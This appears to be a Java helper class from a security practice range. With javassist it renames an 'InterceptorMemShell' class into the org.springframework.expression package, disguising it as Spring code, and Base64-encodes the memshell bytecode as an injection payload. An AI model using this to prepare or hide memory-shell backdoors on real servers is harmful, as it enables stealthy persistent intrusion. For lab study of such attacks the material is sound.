package com.best.hello.util;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.junit.Test;

import java.io.IOException;
import java.net.URISyntaxException;
import java.util.Base64;

import static com.best.hello.newPayload.RCE.MemShell.MemShell.toByteArray3;
import static com.best.hello.newPayload.RCE.MemShell.MemShell.writeFile1;
import static com.best.hello.newPayload.RCE.MemShell.MemShell.writeFile2;


public class modifyJavaClass {
    private static final String targetClassPath;

    private static final String baseClassPath = "org.springframework.expression.";

    private static final String originalClassPath = "InterceptorMemShell";

    static {
        try {
            targetClassPath = Thread.currentThread().getContextClassLoader().getResource("").toURI().getPath().replaceFirst("/","");
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
    }

    public static void modifyJavaClassName(String originalName, String newJavaClassName) {
        try {
            // 获取类池
            ClassPool classPool = ClassPool.getDefault();
            // 获取类
            CtClass ctClass = classPool.get(originalName);
            ctClass.setName(newJavaClassName);


            // 写入修改
            ctClass.writeFile(targetClassPath);
            // 加载修改后的类
            ctClass.toClass();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static void getClassPath() {
        System.out.println(targetClassPath);
    }

    public static void getNewBytecode() throws IOException {
        String filename = "D:\\Code_Vul\\Java-Sec-Range\\target\\classes\\org\\springframework\\expression\\InterceptorMemShell.class";
        byte[] MemShell = toByteArray3(filename);
        String newfilename = "Base64InterceptorMemShellCru.txt";
        byte[]  encMem = Base64.getEncoder().encode(MemShell);
//        System.out.println(Base64.getEncoder().encode(MemShell));
        writeFile2(newfilename, encMem);
    }
//    @Test
//    public void modify(){
////        getClassPath();
//        modifyJavaClassName(originalClassPath, baseClassPath + originalClassPath);
////        getNewBytecode();
//    }
    public static void main(String[] args) throws IOException {
//        getClassPath();
//        modifyJavaClassName(originalClassPath, baseClassPath + originalClassPath);
        getNewBytecode();
    }

}
